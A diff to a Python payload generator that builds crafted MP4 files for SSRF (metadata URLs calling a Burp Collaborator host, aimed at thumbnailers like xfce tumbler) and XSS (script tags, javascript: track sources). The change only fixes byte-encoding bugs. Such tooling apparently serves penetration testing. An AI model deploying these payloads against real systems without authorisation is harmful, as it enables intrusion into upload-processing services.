@@ -119,19 +119,19 @@ def generate_mp4_payloads(output_dir, burp_collab):
     with open(info_leak_dir / "info3_memory_disclosure.mp4", 'wb') as f:
         f.write(mp4_info3_memory_disclosure)
     
-    mp4_ssrf1_thumbnailer_metadata = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><cover>{base_url}/ssrf-thumbnail</cover></metadata>'.encode() + b'\x00' * 1000)
+    mp4_ssrf1_thumbnailer_metadata = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><cover>{base_url}/ssrf-thumbnail</cover></metadata>'.encode('utf-8') + b'\x00' * 1000)
     with open(ssrf_dir / "ssrf1_thumbnailer_metadata.mp4", 'wb') as f:
         f.write(mp4_ssrf1_thumbnailer_metadata)
     
-    mp4_ssrf2_xfce_tumbler = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><art>{base_url}/ssrf-tumbler</art></metadata>'.encode() + b'\x00' * 1000)
+    mp4_ssrf2_xfce_tumbler = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><art>{base_url}/ssrf-tumbler</art></metadata>'.encode('utf-8') + b'\x00' * 1000)
     with open(ssrf_dir / "ssrf2_xfce_tumbler.mp4", 'wb') as f:
         f.write(mp4_ssrf2_xfce_tumbler)
     
-    mp4_xss1_video_embed = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'<script>alert(1)</script>'.encode() + b'\x00' * 1000)
+    mp4_xss1_video_embed = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'<script>alert(1)</script>' + b'\x00' * 1000)
     with open(xss_dir / "xss1_video_embed.mp4", 'wb') as f:
         f.write(mp4_xss1_video_embed)
     
-    mp4_xss2_track_src = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'<track src="javascript:alert(1)"></track>'.encode() + b'\x00' * 1000)
+    mp4_xss2_track_src = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'<track src="javascript:alert(1)"></track>' + b'\x00' * 1000)
     with open(xss_dir / "xss2_track_src.mp4", 'wb') as f:
         f.write(mp4_xss2_track_src)
     
